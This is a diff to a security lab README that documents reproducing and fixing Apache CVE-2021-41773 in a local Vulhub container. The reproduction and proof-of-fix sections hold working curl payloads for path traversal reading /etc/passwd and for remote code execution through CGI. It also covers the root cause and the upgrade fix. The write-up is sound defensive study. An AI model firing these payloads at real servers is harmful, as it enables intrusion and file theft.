@@ -132,33 +132,123 @@ pull request. It performs:
 - **SAST (Bandit):** static analysis of `app.py` for common security issues.
 - **SCA (pip-audit):** scans installed dependencies for known CVEs.
 
-> **Screenshot:** Bandit and pip-audit results from the GitHub Actions tab —
-> see `screenshots/ci-pipeline.png` (to be added after first push).
+> **Screenshot:** Bandit and pip-audit results from the GitHub Actions tab.
+> The first run failed because pip-audit detected vulnerabilities in Flask 3.0.3
+> and PyJWT 2.9.0; after upgrading to Flask 3.1.3+ and PyJWT 2.15.0+, the
+> second run passed successfully.
+>
+> Last successful pipeline: https://github.com/mycbdys/hdu-is-lab1-secure-api/actions/runs/39251020941
 
 ---
 
-## 4. Selected Vulnerability (CVE)
+## 4. Selected Vulnerability: CVE-2021-41773
 
-> Details to be filled in after the Vulhub reproduction.
-
-- **CVE ID:** _(pending)_
-- **Description:** _(pending)_
+- **CVE ID:** CVE-2021-41773
+- **Affected software:** Apache HTTP Server 2.4.49
+- **Description:** A path normalization flaw in Apache 2.4.49 allows remote attackers
+  to map URLs to files outside the expected document root via path traversal
+  sequences using URL-encoded dots (`%2e`). If CGI is enabled on aliased paths,
+  this can escalate to remote code execution.
 
 ### 4.1 Reproduction Steps
 
-_(pending)_
+**Environment:** Vulhub `httpd/CVE-2021-41773`, Apache 2.4.49 with CGI enabled,
+accessible at `http://localhost:8081`.
+
+```bash
+# 1. Start the vulnerable environment
+cd vulhub/httpd/CVE-2021-41773
+docker compose up -d
+
+# 2. Normal request — confirms the server is up
+curl http://localhost:8081/
+# -> <html><body><h1>It works!</h1></body></html>
+
+# 3. Path traversal — read /etc/passwd outside the document root
+curl --path-as-is http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+# -> root:x:0:0:root:/root:/bin/bash
+#    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+#    ... (full /etc/passwd contents disclosed)
+
+# 4. Remote code execution via CGI
+curl --path-as-is --data "echo;id" http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+# -> uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+The attack works because `/icons/` is an existing aliased directory, and the
+`/.%2e/` sequence bypasses the path-normalization check: Apache decodes `%2e`
+to `.` *after* the traversal check, so `/.%2e/` collapses to `/../` and escapes
+the document root.
 
 ### 4.2 Root Cause Analysis
 
-_(pending)_
+In Apache HTTP Server 2.4.49, a refactoring of the path-normalization logic
+(introduced to resolve a different edge case) changed the order of operations:
+
+1. The server checked for `..` segments **before** URL-decoding percent-encoded
+   characters.
+2. The attacker supplies `/.%2e/` — at check time this looks like a single
+   dot (`.`) segment, which is harmless.
+3. After the check, `%2e` is decoded to `.`, turning `/.%2e/` into `/./` and
+   when chained: `/.%2e/%2e%2e/...` effectively becomes `/../../etc/passwd`.
+
+This is a **logic error** in input handling: the traversal check was performed
+on the wrong representation of the path (pre-decoding instead of post-decoding).
+The vulnerability is exploitable when:
+- An aliased directory (like `/icons/`) exists, and
+- Files outside the web root are not protected by `Require all denied`.
 
 ### 4.3 Applied Fix
 
-_(pending)_
+**Solution:** Upgrade Apache HTTP Server from 2.4.49 to **2.4.51**.
+
+The original fix (2.4.50) corrected the order of path normalization, but a
+bypass (CVE-2021-42013) was found that used double-encoded sequences
+(`.%%32%65/`). Version 2.4.51 fully resolves both variants.
+
+Changed in `Dockerfile`:
+```dockerfile
+# BEFORE (vulnerable):
+FROM vulhub/httpd:2.4.49
+
+# AFTER (fixed):
+FROM httpd:2.4.51
+```
+
+All other configuration (CGI modules enabled, `Require all granted` on `/`)
+remains identical, proving that the fix is in the software version, not in
+hardening the config.
 
 ### 4.4 Proof of Fix
 
-_(pending)_
+After rebuilding with `httpd:2.4.51` and restarting:
+
+```bash
+# Confirm the patched version
+docker exec <container> /usr/local/apache2/bin/httpd -v
+# -> Server version: Apache/2.4.51 (Unix)
+
+# Repeat the exact same path traversal attack
+curl --path-as-is http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+# -> HTTP 400 Bad Request  (attack rejected, no /etc/passwd leaked)
+
+# Repeat the CGI RCE attack
+curl --path-as-is --data "echo;id" http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+# -> HTTP 400 Bad Request  (no code execution)
+
+# Regression: normal functionality still works
+curl http://localhost:8081/
+# -> HTTP 200, <html><body><h1>It works!</h1></body></html>
+
+curl http://localhost:8081/icons/
+# -> HTTP 200 (directory listing works normally)
+```
+
+Both attack vectors now return **400 Bad Request**, while normal web serving
+returns **200 OK** — the vulnerability is closed and functionality is intact.
+
+> Fix files are in the `cve-fix/` directory: `Dockerfile.vulnerable` (original),
+> `Dockerfile.fixed` (patched), and `docker-compose.yml`.
 
 ---
 
@@ -168,7 +258,11 @@ _(pending)_
 .
 ├── app.py                  # Flask application
 ├── requirements.txt        # Python dependencies
-├── .github/workflows/ci.yml
-├── users.db                # SQLite database (auto-created)
+├── .github/workflows/ci.yml # GitHub Actions CI/CD
+├── cve-fix/                # CVE-2021-41773 fix files
+│   ├── Dockerfile.vulnerable  # original (Apache 2.4.49)
+│   ├── Dockerfile.fixed       # patched (Apache 2.4.51)
+│   └── docker-compose.yml
+├── users.db                # SQLite database (auto-created, gitignored)
 └── README.md
 ```
